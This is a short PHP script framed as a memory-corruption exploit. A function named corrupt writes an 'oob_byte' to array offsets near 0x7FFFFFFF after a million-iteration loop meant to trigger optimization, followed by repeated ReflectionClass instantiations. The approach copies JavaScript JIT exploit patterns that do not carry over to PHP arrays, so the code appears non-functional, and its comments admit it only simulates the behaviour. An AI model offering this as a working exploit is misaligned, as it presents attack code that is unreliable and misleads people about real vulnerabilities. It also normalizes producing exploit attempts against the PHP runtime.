<?php
require "/home/w023dtc/template.inc";


class A {}

function corrupt(&$array, $offset, $oob_byte) {
    $base = -0x7FFFFFC1 + $offset;
    $array[$base - (-0x80000000)] = 0x4B;
    $array[$base + 0x7FFFFFE1] = 0x4B;
    $array[$base + 0x7FFFFFC1] = $oob_byte;
}

function trigger_optimize() {
    $array = array_fill(0, 0x40, 0);
    for ($i = 0; $i < 1000000; $i++) {
        corrupt($array, 0, 0x00);
    }
}

trigger_optimize();

$exploit_array = array_fill(0, 0x40, 0);
corrupt($exploit_array, -2, 0x80);

function test($foo) {
    try {
        $foo();
    } catch (Exception $e) {
        // Do nothing, just to simulate the behavior
    }
    echo "Optimized function called.\n";
    try {
        $foo();
    } catch (Exception $e) {
        // Do nothing, just to simulate the behavior
    }
}

test(function() {
    $reflection = new ReflectionClass('A');
    $reflection->newInstanceArgs(array_fill(0, 0x40, 0));
});

test(function() {
    $reflection = new ReflectionClass('A');
    $reflection->newInstanceArgs(array_fill(0, 0x40, 0));
});

test(function() {
    $reflection = new ReflectionClass('A');
    $reflection->newInstanceArgs(array_fill(0, 0x40, 0));
});

test(function() {
    $reflection = new ReflectionClass('A');
    $reflection->newInstanceArgs(array_fill(0, 0x40, 0));
});

?>
